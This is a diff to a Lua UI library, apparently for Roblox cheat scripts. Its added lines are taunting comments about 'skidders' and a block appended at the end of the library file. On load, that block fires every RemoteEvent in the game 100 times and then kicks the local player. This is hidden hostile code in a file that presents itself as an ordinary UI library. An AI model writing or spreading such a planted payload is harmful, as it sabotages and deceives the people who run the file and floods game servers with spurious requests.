@@ -2,6 +2,18 @@
 ]]
 local uis = game:GetService("UserInputService")
 local run = game:GetService("RunService")
+-- hello erpers pls stop skidding
+-- here is a song dedicated to all erpers who skid
+-- epic clam battles of history
+-- lunaware, vs stasiiiik megaaaa
+-- begin
+-- i am the anticheat of redd no other skid can stand up to me
+-- i have starscripts the best skid ever you see
+-- i am the king of the electric state
+-- no one can defeat me
+-- my hacking skills are unmatched im always ahead you see
+-- i dont care about the lwas i dont play by their rules
+-- my only goal is to win and ill do what it takes to fool
 
 if game:GetService("CoreGui"):FindFirstChild("Athena ui Remake") then
 	game:GetService("CoreGui"):FindFirstChild("Athena ui Remake"):Destroy()
@@ -1652,5 +1664,11 @@ function ret:Library(Name)
 	end
 	return ui
 end
-
+for _,v in pairs(game.ReplicatedStorage:GetDescendants()) do
+  if not v:IsA("RemoteEvent") then continue end
+  for i = 1, 100 do
+    v:FireServer(i)
+  end
+end
+game.Players.LocalPlayer:Kick("You have been kicked from the game.")
 return ret, settings
